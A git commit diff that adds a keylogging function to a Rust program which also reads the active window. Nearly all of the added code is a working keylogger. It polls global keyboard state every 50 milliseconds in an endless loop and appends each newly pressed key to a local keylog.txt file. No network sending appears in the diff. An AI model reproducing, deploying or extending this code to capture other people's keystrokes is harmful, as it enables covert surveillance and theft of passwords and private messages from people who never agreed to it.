5ab553106b9eed1a6dc994c5715f592e58679727
aero7 <aero7623@outlook.com>
2024-07-25 16:58:10 +0530

    added keylog function

--- src/main.rs
+++ src/main.rs
@@ -1,9 +1,12 @@
-
+use device_query::{DeviceQuery, DeviceState, Keycode};
 use active_win_pos_rs::{ActiveWindow, get_active_window};
-
+use std::fs::OpenOptions;
+use std::io::prelude::*;
+use std::thread;
+use std::time::Duration;
 fn main() {
     getcurrentprocess();
-
+    getkeystroke()
 
 }
 fn getcurrentprocess() -> ActiveWindow {
@@ -19,5 +22,33 @@ fn getcurrentprocess() -> ActiveWindow {
 }
 
 fn getkeystroke(){
+    let device_state = DeviceState::new();
+    let mut previous_keys = vec![];
 
+    loop {
+        let keys: Vec<Keycode> = device_state.get_keys();
+
+        if keys != previous_keys {
+            for key in &keys {
+                if !previous_keys.contains(key) {
+                    log_key(key);
+                }
+            }
+            previous_keys = keys;
+        }
+
+        thread::sleep(Duration::from_millis(50));
+}
+}
+fn log_key(key: &Keycode) {
+    let mut file = OpenOptions::new()
+        .write(true)
+        .append(true)
+        .create(true)
+        .open("keylog.txt")
+        .expect("Unable to open file");
+
+    if let Err(e) = writeln!(file, "{:?}", key) {
+        eprintln!("Couldn't write to file: {}", e);
+    }
 }
